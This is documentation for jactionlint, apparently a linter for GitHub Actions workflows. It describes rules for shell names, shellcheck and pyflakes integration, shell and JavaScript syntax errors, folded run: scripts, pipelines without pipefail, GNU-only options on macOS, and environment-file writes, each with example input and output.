[Playground](https://jactionlint.jdx.dev/#eNqkkMHKgzAQhO8+xdw8Cf85bxN1Jf6s2eBmsVD67mWtlOKp2Nsk85F8jOSAYpqaf+k1NADP2W4egNWydg5Yb7lax7GS1r3SSkVfFNA5GUBDErSJmKU9GkD9HDBGTd/TRTZa99wASxxOOkscRD9tRpqicX0L+QfnN6dZ0yX1ttDKuP89vNnmPMqmJ6Hj9peBrs3zHAA+f36k)

**What is reported.** The shell names that [GitHub documents](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#using-a-specific-shell) depend on the system of the runner. jactionlint reads the system from the labels of `runs-on:`: `windows` and `windows-*` are Windows, and `linux`, `macos`, `macos-*` and `ubuntu-*` are Linux or macOS. A name is compared without regard to case.

| Runner of the job | Accepted names |
| --- | --- |
| Linux or macOS | `bash`, `pwsh`, `python`, `sh` |
| Windows | `bash`, `cmd`, `powershell`, `pwsh`, `python` |
| Not known: no label names a system (for example `${{ matrix.os }}`), or the labels name both | `bash`, `cmd`, `powershell`, `pwsh`, `python`, `sh` |

When the name is valid on the other system, the message says where it is invalid ("is invalid on Windows", "is invalid on macOS or Linux"). The `shell:` of `defaults.run` at the workflow level has no runner to compare with, so it accepts every name of the last row.

**What is not reported.** A custom shell, which is a value with `{0}` such as `perl {0}`, and a name that contains an expression `${{ }}`.

**Related.** The shell decides whether a script gets findings of [shellcheck](#check-shellcheck-integ), [pyflakes](#check-pyflakes-integ) and [pipelines without pipefail](#check-pipeline-without-pipefail).

<a id="check-shellcheck-integ"></a>
## shellcheck integration for `run:`

The rule `shellcheck` runs [shellcheck](https://github.com/koalaman/shellcheck) on each `run:` script that a `bash` or `sh` shell runs, and reports what shellcheck finds at the script in the workflow file. shellcheck has to be installed; see [its installation page](https://github.com/koalaman/shellcheck#installing).

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo $FOO
  test-win:
    runs-on: windows-latest
    steps:
      # Shell on Windows is PowerShell by default.
      # shellcheck is not run in this case.
      - run: echo $FOO
      # This script is run with bash due to 'shell:' configuration
      - run: echo $FOO
        shell: bash
```

Output:

```
test.yaml:6:19: shellcheck reported issue in this script: SC2086:info:1:6: Double quote to prevent globbing and word splitting [shellcheck]
  |
6 |       - run: echo $FOO
  |                   ^~~~
test.yaml:14:19: shellcheck reported issue in this script: SC2086:info:1:6: Double quote to prevent globbing and word splitting [shellcheck]
   |
14 |       - run: echo $FOO
   |                   ^~~~
```

<!-- Skip playground link -->

**What is reported.** In `SC2086:info:1:6:`, shellcheck reports the code SC2086 at level `info`, at line 1 and column 6 of the script. The location is relative to the script of the `run:`, not to the workflow file. jactionlint reports the finding at the token of the script in the workflow file, whatever the style of the `run:` scalar. An [ignore comment](./ignore.md#ignore-some-errors) on the step or at the `run:` key covers the lines of the script; [where shellcheck findings are reported](./actionlint.md#where-shellcheck-findings-are-reported) lists how this differs from actionlint.

**Which scripts are checked.** jactionlint detects the shell as [the GitHub documentation](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#using-a-specific-shell) describes it. The default shell is `bash` on Linux and macOS and `pwsh` on Windows, and `shell:` at the workflow level, the job level or the step changes it. jactionlint remembers the default shell, checks which system the job runs on, and applies shellcheck only when the shell is `bash` or `sh`. In the example, the Windows job runs its first script with `pwsh`, so shellcheck does not see it, and its second script has `shell: bash`, so shellcheck does.

When the shell cannot be determined statically, jactionlint assumes `shell: bash`. In this job, for example, the shell depends on the matrix:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
runs-on: ${{ matrix.os }}
steps:
  - name: Show file content
    run: Get-Content -Path xxx\yyy.txt
    if: ${{ matrix.os == 'windows-latest' }}
```

The script 'Show file content' runs only on Windows because of the `matrix.os == 'windows-latest'` condition, and `pwsh` runs it. jactionlint does not know that. It checks the script with shellcheck and probably reports a false positive, because of the file separator. Name the shell to avoid this kind of false positive. It also makes the workflow easier to maintain.

```yaml
- name: Show file content
  run: Get-Content -Path xxx\yyy.txt
  if: ${{ matrix.os == 'windows-latest' }}
  shell: pwsh
```

**What shellcheck sees.** The syntax `${{ }}` and the variable access `$FOO` both use `$`, so a remaining `${{ }}` would confuse shellcheck. jactionlint replaces each `${{ }}` with underscores of the same length: `echo '${{ matrix.os }}'` is checked as `echo '________________'`. Some shellcheck codes report that replacement instead of a mistake in the script, so jactionlint disables them:

| Code | Why it is disabled |
| --- | --- |
| [SC1091](https://github.com/koalaman/shellcheck/wiki/SC1091) | The file that `source` reads is not found. The script is written for the runner, not for the machine that runs jactionlint. |
| [SC2043](https://github.com/koalaman/shellcheck/wiki/SC2043) | A loop over a replaced expression looks like it runs once: `for foo in ${{ inputs.foo }}; do`. |
| [SC2050](https://github.com/koalaman/shellcheck/wiki/SC2050) | A condition on a replaced expression looks constant: `[ "${{ matrix.foo }}" = "x" ]`. |
| [SC2153](https://github.com/koalaman/shellcheck/wiki/SC2153) | Same reason as SC2154. |
| [SC2154](https://github.com/koalaman/shellcheck/wiki/SC2154) | A variable is referenced but not assigned in the script, although `env:` can define it. |
| [SC2157](https://github.com/koalaman/shellcheck/wiki/SC2157) | The argument of `-z` is always false after the replacement: `[ -z ${{ env.FOO }} ]`. |
| [SC2194](https://github.com/koalaman/shellcheck/wiki/SC2194) | The word is constant after the replacement: `if ${{ matrix.foo }}; then`. |

**Configure.** jactionlint looks for the command `shellcheck` and uses it when it finds one.

- `--shellcheck=PATH` sets the executable of shellcheck, and `--shellcheck=` with an empty value turns the integration off.
- When the default command is not found, the run prints a note on stderr that says how many scripts were not checked ([external tools](./usage.md#external-tools)). A path given with `--shellcheck` that does not exist stops the run with exit status 3.
- jactionlint runs shellcheck with `--norc` unless you give a rc file. The `--shellcheck-rcfile` option and the [`shellcheck` section of the config file](./config.md#shellcheck) (a `rcfile`, more `args`, optional checks to `enable`) keep the settings with the repository.
- The [`SHELLCHECK_OPTS` environment variable](https://github.com/koalaman/shellcheck/wiki/Integration#environment-variables) works too. From the command line:

```sh
# Enable some optional rules
SHELLCHECK_OPTS='--enable=avoid-nullary-conditions' jactionlint

# Disable some rules
SHELLCHECK_OPTS='--exclude=SC2129' jactionlint
```

On GitHub Actions:

```yaml
- run: jactionlint
  env:
    SHELLCHECK_OPTS: --exclude=SC2129
```

**Related.** When shellcheck does not run, [`shell-syntax`](#check-shell-syntax) reports the syntax errors of a script with a parser that is built into jactionlint.

<a id="check-shell-syntax"></a>
## Syntax errors in shell scripts without shellcheck

The rule `shell-syntax` (in the `default` profile, at the level `error`) reports a syntax error in the script of a `run:` step when [shellcheck](https://github.com/koalaman/shellcheck) does not check that script. shellcheck reports a script that bash cannot read, such as an unclosed quote or a missing `fi`, with its SC1xxx codes, but only when it is installed. This rule reads the script with a bash parser that is built into jactionlint ([mvdan.cc/sh](https://github.com/mvdan/sh)), offline, and reports a syntax error where the step would stop with status 2.

Example input:

```yaml
# without shellcheck
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "building ${{ github.sha }}"
          if [ -f build.log ]; then
            cat build.log
      - run: |
          # OK: [[ ]], arrays, here-strings and process substitution are bash
          arr=(a b c)
          [[ ${#arr[@]} -gt 2 ]] && diff <(sort a) <(sort b) <<< "$arr"
      # OK: pwsh is not read
      - shell: pwsh
        run: |
          if ($true) { Write-Host "x"
  test-win:
    runs-on: windows-latest
    steps:
      # OK: the default shell of a Windows runner is pwsh
      - run: Write-Host "x"
      # This script is run with bash (Git Bash) due to 'shell:' configuration
      - shell: bash
        run: echo "unclosed
```

Output:

```
test.yaml:9:11: syntax error in the bash script of this step (line 2 of the script): `if` statement must end with `fi`. found by the built-in parser because shellcheck did not run [shell-syntax]
  |
9 |           if [ -f build.log ]; then
  |           ^~
test.yaml:26:19: syntax error in the bash script of this step (line 1 of the script): reached EOF without closing quote `"`. found by the built-in parser because shellcheck did not run [shell-syntax]
   |
26 |         run: echo "unclosed
   |                   ^~~~~~~~~
```

<!-- Skip playground link -->

The output of the example is what jactionlint prints when shellcheck does not run (`--shellcheck=` turns it off). To turn the rule off, set it in [the configuration file](config.md#rules):

```yaml
rules:
  shell-syntax: off
```

**What is reported.** The rule is for runs in which shellcheck does not check the script. It stays silent whenever shellcheck runs, so that a mistake is never reported twice. It reports when shellcheck was not found, when it was turned off with `--shellcheck=` and when the rule `shellcheck` is `off` in the configuration. Install shellcheck for the checks of everything else: this rule finds the errors that stop a script and nothing about quoting or style.

The finding is at the token where the parser stopped, which is the opening token (the quote, the `if`, the `$(`) for a construct that is not closed. Only the mistakes that bash finds while it reads a script are reported: an unclosed quote or substitution, a `fi`, `done` or `esac` that is missing or has nothing to close, a keyword where it does not belong, and an operator without its operand.

**What is not reported.** jactionlint reads only what it can read as faithfully as bash does, and reports less rather than a script that bash accepts:

- The shell must be `bash` or `sh`, or a custom template that starts with one of them (`bash -el {0}`). `pwsh`, `powershell`, `cmd`, `python` and every other shell are not read. A step without `shell:` is read only when the job runs on a runner that is known to be Linux or macOS (labels written out, none of them Windows): the default shell of a Windows runner is `pwsh`, and a runner chosen with an expression (`${{ matrix.os }}`) or a self-hosted runner without an operating system in its labels can be one.
- `sh` is read with the bash grammar as well, and reports only what is a syntax error in bash. The `/bin/sh` of a runner is `dash` on Ubuntu but `bash` on macOS and in Git Bash for Windows, so `[[ ]]` or an array in a `shell: sh` script is not called an error here.
- `${{ }}` expressions are replaced by underscores of the same length before the script is read, so a finding is at the right place in the workflow file even when an expression spans several lines. The end of an expression is found with the expression lexer, so a `}}` inside a string literal such as `'}}'` does not end it, unlike for the shellcheck integration, which stops at the first `}}`. A script with an expression that cannot be delimited (not closed, or not valid) is not read at all.
- Bash finds some mistakes only when it runs the command (a bad `${...}` substitution, the syntax of an arithmetic expression), and it treats a here-document that is not closed as a warning, so these are not reported.
- Nothing after the first here-document (`<<`) or the first backquote of a script is reported, and a script with a carriage return is not read. Bash does not read the body of a here-document, and it parses a command in backquotes only when it runs it, while the parser reads both.

**Fix.** There is no automatic fix: correct the script.

<a id="check-pyflakes-integ"></a>
## pyflakes integration for `run:`

The rule `pyflakes` runs [pyflakes](https://github.com/PyCQA/pyflakes) on each `run:` script that is written in Python, which is a script of a step with `shell: python`, and reports what pyflakes finds at the script. pyflakes looks for mistakes, not style issues, which suits the small scripts of `run:`. Install it with `pip install pyflakes`.

Example input:

```yaml
on: push
jobs:
  linux:
    runs-on: ubuntu-latest
    steps:
      # Yay! No error
      - run: print('${{ runner.os }}')
        shell: python
      # ERROR: Undefined variable
      - run: print(hello)
        shell: python
  linux2:
    runs-on: ubuntu-latest
    defaults:
      run:
        # Run script with Python by default
        shell: python
    steps:
      - run: |
          import sys
          for sys in ['system1', 'system2']:
            print(sys)
      - run: |
          from time import sleep
          print(100)
```

Output:

```
test.yaml:10:9: pyflakes reported issue in this script: 1:7: undefined name 'hello' [pyflakes]
   |
10 |       - run: print(hello)
   |         ^~~~
test.yaml:19:9: pyflakes reported issue in this script: 2:5: import 'sys' from line 1 shadowed by loop variable [pyflakes]
   |
19 |       - run: |
   |         ^~~~
test.yaml:23:9: pyflakes reported issue in this script: 1:1: 'time.sleep' imported but unused [pyflakes]
   |
23 |       - run: |
   |         ^~~~
```

<!-- Skip playground link -->

The `linux2` job of the example sets `shell: python` for all its steps with `defaults.run`. Its two scripts show findings of ordinary Python mistakes without a comment in the input: a loop variable that shadows an import, and an import that is not used.

**Which scripts are checked.** A script is Python when the `shell:` of its step is `python` (or starts with `python `), or when `defaults.run.shell` of its job or of the workflow says so. `${{ }}` is not valid Python, so a remaining `${{ }}` would confuse pyflakes. jactionlint replaces each `${{ }}` with underscores of the same length: `print('${{ matrix.os }}')` is checked as `print('________________')`.

**Configure.** jactionlint looks for the command `pyflakes` and uses it when it finds one.

- `--pyflakes=PATH` sets the executable of pyflakes, and `--pyflakes=` with an empty value turns the integration off.
- As with shellcheck, a missing default is noted on stderr, and a path given with `--pyflakes` that does not exist stops the run with exit status 3 ([external tools](./usage.md#external-tools)).
- `--ruff=CMD` runs [ruff](https://docs.astral.sh/ruff/) with its pyflakes rules instead of pyflakes, and reports its findings with the same rule ID `pyflakes` ([ruff](./usage.md#external-tools-ruff)).

<a id="check-github-script-syntax"></a>
## JavaScript syntax of `actions/github-script`

The rule `github-script-syntax` reports a JavaScript syntax error in the `script` input of [actions/github-script](https://github.com/actions/github-script) and shows where it is in the workflow file. GitHub finds such an error only when the step runs, and the message of the action does not say where it is.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Yay! No error
      - uses: actions/github-script@v7
        with:
          script: |
            const { data } = await github.rest.pulls.list({ ...context.repo })
            return data.length
      # ERROR: The comma is not followed by a value
      - uses: actions/github-script@v7
        with:
          script: |
            const issue = await github.rest.issues.get({
              ...context.issue,
              state: ,
            })
      # ERROR: exec is an argument of the function which runs the script since v4
      - uses: actions/github-script@v7
        with:
          script: |
            const exec = require('child_process').exec
            exec('ls')
```

Output:

```
test.yaml:18:22: the script of actions/github-script has a syntax error: Unexpected token ',' [github-script-syntax]
   |
18 |               state: ,
   |                      ^
test.yaml:24:19: the script of actions/github-script has a syntax error: Identifier 'exec' has already been declared [github-script-syntax]
   |
24 |             const exec = require('child_process').exec
   |                   ^
```

<!-- Skip playground link -->

**How the script is checked.** The action runs the script as the body of an `async` function (`new AsyncFunction(...names, script)`), which is why `await` and `return` work at the top level, and why the names of the arguments of the function (`github`, `context`, `core`, `exec`, `glob`, `io`, `require`, ...) are already taken in the script. jactionlint checks the script with `node --check`, wrapped in a function with the arguments of the version of the action, and reports the first syntax error at its place in the workflow file. Only the syntax is checked: node does not run the script, so a module that does not exist or a variable that is not defined is not reported.

**Requirements.** The rule needs `node` in the `PATH`, in version 20 or later, so that newer syntax is not taken for a syntax error. Without `node` the rule does nothing, and the run says so in a note and in the `externalTools` property of the SARIF log ([external tools](./usage.md#external-tools), [SARIF output](./output.md#format-error-messages)).

**Arguments by version.** The arguments of the function are those of the version in the reference: `context`, `core`, `github`, `io` and `require` for all versions, `glob` since v3, `exec` and `__original_require__` since v4, `octokit` since v8 and `getOctokit` since v9. A reference that does not name a version (a commit, a branch) has the arguments that every version has.

**Expressions.** GitHub replaces an expression `${{ }}` before node sees the script, so jactionlint replaces it by underscores of the same length, as it does for `run:` scripts. The replacement is sound only where any value could stand, so jactionlint does not check a script when an expression is not closed, spans lines, has `}}` inside a string, or touches a letter, a digit, `_` or `$` (`1${{ x }}`, `a${{ x }}b`), because the value could continue a number or a name.

<a id="check-multiline-plain-run"></a>
## Scripts folded into one line

The rule `multiline-plain-run` reports a `run:` that is written over several lines without a block scalar (`|`). YAML folds the line breaks of such a scalar into spaces, so the shell runs one long command instead of one command per line.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: without | YAML folds the lines into one, so this is one echo command
      - run: echo "building"
          npm ci
          npm test
      # OK: a block scalar keeps the lines
      - run: |
          echo "building"
          npm ci
          npm test
      # OK: one command wrapped over several lines
      - run: docker build
          --tag app
          .
```

Output:

```
test.yaml:9:11: this "run:" is not a block scalar, so YAML folds its 3 lines into one line and the shell runs the single command `echo "building" npm ci npm test`. write `run: |` to keep the lines [multiline-plain-run]
  |
9 |           npm ci
  |           ^~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkzDEOwyAMheGdUzxldw+Q2wBBCW1qrNjeeviKVkKoa1mQnj/9jVeI6xHCvSVdA2BFrf/A5azUgSdnczpjvwUAUCuiXwVQlytKPhqW5PXcKu9LwHgsT+T6M4zWCLwm8Xdsa/lRLnwKEyayuCOKTNvtPQD6TkJF)

In the first step of the example, the shell runs the single command `echo "building" npm ci npm test`, which prints its arguments and does nothing else ([actionlint#441](https://github.com/rhysd/actionlint/issues/441)).

**What is reported.** The rule reports the first line that looks like a command of its own. Wrapping one long command over several lines is common and right, so the rule is conservative. A line counts when both of these hold:

- It starts with the name of a well-known command (`echo`, `cd`, `npm`, `make`, ...), or with an assignment (`x=1`) after a command that takes none (`echo a`).
- The line before it is not unfinished: it does not end with `&&`, `|`, `\` and the like, it does not leave a quote, a bracket or a `${{ }}` open, and it does not start with a command that takes another command as an argument (`docker`, `ssh`, `sudo`, `xargs`, `find`, ...).

**What is not reported.** A script in a block, a script of `shell: python`, and a script on one line. Lines that a blank line separates are not compared, because the blank line is kept as a line break.

**Fix.** `--fix` writes the scalar as a block (`run: |`) with one line of the scalar on each line. It does so only in the narrowest shape, because it rewrites a script: the value starts on the line of the `run:` key, and every line is a complete command that starts with a well-known command (`echo`, `cd`, `npm`, `git`, `make`, ...). The finding has no fix, and says why, when the script has an assignment, a keyword, an operator, a backslash or a heredoc. The same holds for a line that continues the command before it (`make test` then `CC=gcc`), a quote, bracket, backtick or `$(` that stays open at the end of a line, a blank line, a `#` or an escape in a double quoted scalar, and text after the scalar. A line that only holds the quote of a quoted scalar is folded into a space like any other line break.

<a id="check-pipeline-without-pipefail"></a>
## Pipelines that hide failures

The rule `pipeline-without-pipefail` reports a pipeline of a `run:` script in which a failing command is hidden, because the shell does not enable `pipefail`. The default shell of a step on Linux and macOS runs `bash -e {0}`, and `shell: sh` runs `sh -e {0}`. Neither enables `pipefail`, so the exit status of `cmd1 | cmd2` is the one of `cmd2` alone. When `cmd1` fails, the step still succeeds and the broken output is passed on silently. An explicit `shell: bash` runs `bash --noprofile --norc -eo pipefail {0}`, which does not have this problem.

The rule is in the `default` profile, not in the `correctness` profile. To turn it off, set it in [the config file](./config.md#rules):

```yaml
rules:
  pipeline-without-pipefail: off
```

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: when curl fails, jq reads an empty input and the step succeeds
      - run: curl -fsSL https://example.com/data.json | jq .
      - run: |
          # ERROR: a failure of 'make' is hidden by 'tee'
          make 2>&1 | tee build.log
          # OK: the pipeline is the condition of 'if'
          if make | grep -q ready; then echo ready; fi
      - run: |
          set -o pipefail
          # OK: pipefail is on
          make 2>&1 | tee build.log
      # OK: 'shell: bash' enables pipefail
      - shell: bash
        run: make 2>&1 | tee build.log
```

Output:

```
test.yaml:7:14: failure of "curl" is hidden in the pipeline "curl -fsSL https://example.com/data.json | jq ." because the default shell runs "bash -e {0}" without pipefail. add "set -o pipefail" before the pipeline or use "shell: bash", which runs with pipefail [pipeline-without-pipefail]
  |
7 |       - run: curl -fsSL https://example.com/data.json | jq .
  |              ^~~~
test.yaml:10:11: failure of "make" is hidden in the pipeline "make 2>&1 | tee build.log" because the default shell runs "bash -e {0}" without pipefail. add "set -o pipefail" before the pipeline or use "shell: bash", which runs with pipefail [pipeline-without-pipefail]
   |
10 |           make 2>&1 | tee build.log
   |           ^~~~
```

<!-- Skip playground link -->

#### How pipeline-without-pipefail decides

jactionlint reports a pipeline when all of the following hold:

- The shell has no pipefail: the default shell on a runner that is known to be Linux or macOS, `shell: sh`, or a custom `bash` or `sh` template with errexit and without `pipefail`. The default shell of Windows is `pwsh`, so jobs on Windows runners, and jobs whose runner is not known from `runs-on:`, are skipped. The shell of the step, of `defaults.run.shell` of the job and of the workflow are considered.
- The script does not turn it on before the pipeline with `set -o pipefail`, `set -eo pipefail`, `set -euxo pipefail`, `set -o errexit -o pipefail` or `SHELLOPTS=pipefail` (and does not turn it off again with `set +o pipefail`).
- A stage in front of the last one is a command whose failure matters. `echo`, `printf`, `true`, `yes`, `cat` of a here document or here string, and similar commands that cannot meaningfully fail do not count. Filters such as `sed`, `awk`, `sort` and `tail` do not count in the middle of a pipeline either, because a failure of what feeds them is reported at that command. `grep`, `rg` and `diff` never count: their non-zero status means "no match" or "files differ", and `pipefail` would turn that expected answer into a failed step.
- The script does not handle the status of the pipeline itself: it is not negated with `!`, not the condition of `if`, `elif`, `while` or `until`, and not an operand of `&&` or `||` other than the last one of a list (`cmd | grep x || true`). A command followed by `|| true` in the first stage is not blamed either: `{ git show || true; echo done; } | sort` is not reported, and `{ git show || true; cat note; } | sort` is reported for `cat`, not for `git`.
- No later stage stops reading early. `head`, `grep -q`, `grep -m`, `read`, `sed ... q` and `awk ... exit` end the pipeline before the producer is done, which kills it with SIGPIPE. With `pipefail` such a pipeline fails although nothing went wrong, so such pipelines are not reported. That holds for a pipeline in the body of a loop as well (`for s in a b; do cmd "$s" | grep -Fq x; done`).
- The script does not read `PIPESTATUS` in the command right after the pipeline, for the stage that hides the failure (`make | tee log; rc=${PIPESTATUS[0]}`) or for all of them (`${PIPESTATUS[@]}`). Reading it means that the script looks at the status itself. The word without a `$`, the count `${#PIPESTATUS[@]}` and the status of another stage do not count. When the status is copied into a plain scalar variable (`rc=${PIPESTATUS[0]}`), the script has to check the variable later: in a test (`[ "$rc" -ne 0 ]`, `[[ ]]`, `test`), an arithmetic condition (`if (( rc ))`), `exit $rc` or `return $rc`. A copy that is never checked, is only printed, or is assigned again before the check is still reported.
- The pipeline is not inside a command substitution in the argument of a command (`echo "hash=$(sha256sum f | cut -d' ' -f1)"`): the status of the substitution is not the status of anything, so `pipefail` would change nothing. The value of an assignment (`hash=$(sha256sum f | cut -d' ' -f1)`) is the status of the assignment, and that pipeline is reported.

**Fix.** Add `set -o pipefail` before the pipeline, or use `shell: bash`. dash, the `sh` of Ubuntu, has no `pipefail`, so use `shell: bash` instead of `shell: sh`. Turning `pipefail` on makes hidden failures fail the step, and `grep` without a match exits with 1, so check pipelines such as `cmd | grep pattern | wc -l` before you enable it.

`--fix=unsafe` inserts `set -o pipefail` as the first line of a `run: |` script, for the default shell and custom `bash` templates only. The fix is unsafe because failures that the pipeline used to hide fail the step after it. The finding has no fix in these cases:

- the script is not a literal block scalar (`run: |`), for example a command on the line of `run:`, or the source differs from what the parser saw (tabs, a comment after the `|`)
- the shell is `sh`, another shell that is not bash, or is chosen with an expression
- the script holds a pipeline that stops reading early, because the fix turns `pipefail` on for the whole script (one such pipeline anywhere in the script is enough).

### Known limits of this rule

The rule decides from the words of a script without running it, so it is wrong in these ways. Silence a finding that is one of them with `# jactionlint ignore=pipeline-without-pipefail`, or turn the rule off with `rules: {pipeline-without-pipefail: off}`:

- It cannot tell whether the first stage fails in practice. A producer that never fails (a command of your own) is reported like `curl`, unless it is in the list of commands that cannot fail.
- Functions, aliases and sourced files are not followed: `pipefail` set in a script that is `source`d, or a pipeline inside a shell function that is called with `set -o pipefail` already on, is judged by the lines in front of it.
- A shell that is chosen with an expression, a runner chosen with an expression, and a script with a `${{ }}` in the shell syntax that makes it unparsable are skipped: no finding is made on a guess.
- A program that exits early without being one of the known commands (`mysql -e`, a pager, your own reader) can get SIGPIPE under `pipefail`, so a fix may turn a pipeline that worked into a failing one. That is why the fix is unsafe.
- `grep`, `rg` and `diff` as the first stage are never blamed, although a failure of `grep` with status 2, which is not a missing match, is hidden too.

The rule has no option that makes it more conservative: it would have to guess which of these a finding is, and the guesses are the cases in this list.

<a id="check-macos-gnu-flags"></a>
## GNU-only options on macOS runners (pedantic)

The rule `macos-gnu-flags` (in the `pedantic` profile, as a warning) reports an option of a command in a `run:` script that the GNU version of the command has and the BSD version on macOS does not, in a job that runs on macOS. A workflow that was written and tried on Linux fails with `tee: illegal option -- -` on the first macOS job.

Example input:

```yaml
# select: macos-gnu-flags
on: push
jobs:
  build:
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - run: make 2>&1 | tee --append build.log
      - run: sed -i 's/0.0.0/1.2.3/' version.txt
      - run: grep -oP 'v\K[0-9.]+' version.txt
```

Example config:

```yaml
rules:
  macos-gnu-flags: warn
```

Output:

```
test.yaml:10:30: warning: "tee --append" is rejected by the tee of macOS ("illegal option -- -"): it has only short options. The job runs on macOS (macos-latest), whose tee is the BSD one. Use "tee -a". [macos-gnu-flags]
   |
10 |       - run: make 2>&1 | tee --append build.log
   |                              ^~~~~~~~
test.yaml:11:18: warning: "sed -i" without a suffix takes the script as the suffix of the backup on macOS, so the file is read as the script ("invalid command code"). The job runs on macOS (macos-latest), whose sed is the BSD one. Use "sed -i.bak" (and remove the backup), which both seds understand, or "sed -i ''" on macOS only. [macos-gnu-flags]
   |
11 |       - run: sed -i 's/0.0.0/1.2.3/' version.txt
   |                  ^~
test.yaml:12:19: warning: "grep -P" is rejected by the grep of macOS ("invalid option -- P"): it has no Perl regular expressions. The job runs on macOS (macos-latest), whose grep is the BSD one. Use "grep -E" if the pattern allows it, or "perl -ne", which macOS has too. [macos-gnu-flags]
   |
12 |       - run: grep -oP 'v\K[0-9.]+' version.txt
   |                   ^~~
```

<!-- Skip playground link -->

The example config turns the rule on with `rules: {macos-gnu-flags: warn}` in the [configuration file](config.md#rules). The `pedantic` profile turns the rule on as well.

**What is reported.** A job runs on macOS when a `runs-on` label is the label of a GitHub-hosted macOS runner (`macos-latest`, `macos-15`, `macos-14-large`, `xcode-27` and the like), or when a value of `runs-on: ${{ matrix.os }}` is one. The rule reports only what the sources that Apple publishes for the commands of macOS (`shell_cmds`, `file_cmds` and `text_cmds` of [apple-oss-distributions](https://github.com/apple-oss-distributions)) show to fail:

| Form | macOS |
| --- | --- |
| `tee --append` | `tee` has only `-a` and `-i`, and no long option |
| `sed -i 's/a/b/' file` (no suffix) | `-i` takes the next word as the suffix of the backup, so the script is taken for it |
| `sed --in-place` | `sed` has no long option |
| `date -d`, `date --date` | `date` has no `-d`; BSD `date` reads a time with `-j -f` and `-v` |
| `grep -P`, `grep --perl-regexp` | the options of the macOS `grep` have no `P` |
| `stat -c`, `stat --format` | the format option of BSD `stat` is `-f` |
| `find -printf`, `-regextype`, `-xtype` | they are not primaries of the macOS `find` |
| `cp --parents` | `cp` has no long option |

Forms that look GNU-only and work on macOS are not reported: `xargs -r` (accepted for compatibility), `sort -V` and `readlink -f` (since macOS 12.3). The real command is found behind `sudo`, `env`, `timeout`, `xargs` and similar wrappers, with their options.

**What is not reported.** The rule leaves out what may be meant for another system:

- A job on a self-hosted runner, because its owner can have installed the GNU tools, and a job that runs in a `container:`.
- A command whose failure the script handles (`if grep -P ...`).
- A script that also calls the command in the form of macOS: `date -j -f ... || date -d ...`, `stat -f` next to `stat -c`, `sed -i bak` next to `sed -i`, `tee -a` next to `tee --append`.
- A step whose `if:` reads the `runner` or `matrix` context, or whose script is written for more than one system.
- The command line in the operand of `env -S '...'`: it is read to decide what the script is written for (`env -S 'gsed ...'`), but a GNU-only option in it is not reported, because its words have no place of their own in the script.
- Scripts of other shells than bash and sh.

Whether a script is written for more than one system is decided from the parsed script, not from its text. It is when the script expands `$OSTYPE` or `$RUNNER_OS`, reads `runner.os` or `matrix.os` in an expression, calls `uname` or `sw_vers`, has a GNU tool by its Homebrew name as a command word (`gsed`, `gdate` and the like), or names a `gnubin` directory. `brew install coreutils` (or `grep`, `gnu-sed` and so on) alone is not enough: the formulas are keg-only, so the BSD tool stays first on the `PATH` until the `gnubin` directory is put on it.

**Fix.** There is no automatic fix: the portable form depends on the script.

<a id="check-environment-file-redirect"></a>
## Writes to the environment files that lose data

The rule `environment-file-redirect` reports a script that writes to `GITHUB_OUTPUT` or to another environment file of the runner in a way that loses data: without the `$` in front of the name, or with a `>` that empties the file after the script already wrote to it.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: without a $ this writes a file named GITHUB_OUTPUT in the working directory
      - id: version
        run: echo "version=1.2.3" >> GITHUB_OUTPUT
      # ERROR: the second > empties the file, so "a" is lost
      - id: pair
        run: |
          echo "a=1" >> "$GITHUB_OUTPUT"
          echo "b=2" > "$GITHUB_OUTPUT"
      # OK: the variable, appended
      - run: echo "c=3" >> "$GITHUB_OUTPUT"
      # OK: each step has its own file, so a lone > is harmless
      - run: echo "d=4" > "$GITHUB_OUTPUT"
```

Output:

```
test.yaml:9:38: writing to "GITHUB_OUTPUT" creates a file with that name in the working directory, because without a `$` it is not the variable: the runner never sees it, so nothing is set as an output of the step. write `"$GITHUB_OUTPUT"` [environment-file-redirect]
  |
9 |         run: echo "version=1.2.3" >> GITHUB_OUTPUT
  |                                      ^~~~~~~~~~~~~
test.yaml:14:22: `>` empties $GITHUB_OUTPUT before it writes, so what this script wrote to it before is lost. append with `>>` [environment-file-redirect]
   |
14 |           echo "b=2" > "$GITHUB_OUTPUT"
   |                      ^~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8jj3LwjAURvf+iofwrim0fadAOriokw7tLP0ItCJJ6U2c/PGSGMTgxxRyz7mHa7TA4mjKsrPpSWSAVWT9C6xOE/eC6522jl86zwIiqxZ6WADHPApc1Uqz0XEWtgXUMBmwiGSRl3nFUNfY7ptduzkd2ubYNklm6eY1bdyeX8ReJ4tQYX9Jh72JvSwZvnr89cZBVr+aiTvK/0/Z+wCol1U1)

`GITHUB_OUTPUT`, `GITHUB_ENV`, `GITHUB_PATH`, `GITHUB_STEP_SUMMARY` and `GITHUB_STATE` are variables that hold the path of the file the runner reads after the step.

**What is reported.**

- A redirect or a `tee` to one of these bare words in a `bash` or `sh` script. `echo "a=b" >> GITHUB_OUTPUT` has no `$`, so the word is the name of a file: the shell creates it in the working directory, the runner never sees it, and `steps.<id>.outputs.a` is silently empty ([ghlint#646](https://github.com/TWiStErRob/net.twisterrob.ghlint/issues/646)).
- A `>` (or a `tee` without `-a`) to the file of the step after the same script already wrote to it, because `>` empties the file and the earlier data is lost.

**What is not reported.** A lone `>` is not reported, because each step has files of its own. Neither is a `>` in the other branch of an `if`, or after a write that may not run (in a branch, a loop, a function or a pipeline). PowerShell (`$env:GITHUB_OUTPUT`) and cmd (`%GITHUB_OUTPUT%`) scripts are not analyzed, and a script that sets the variable itself is not reported.

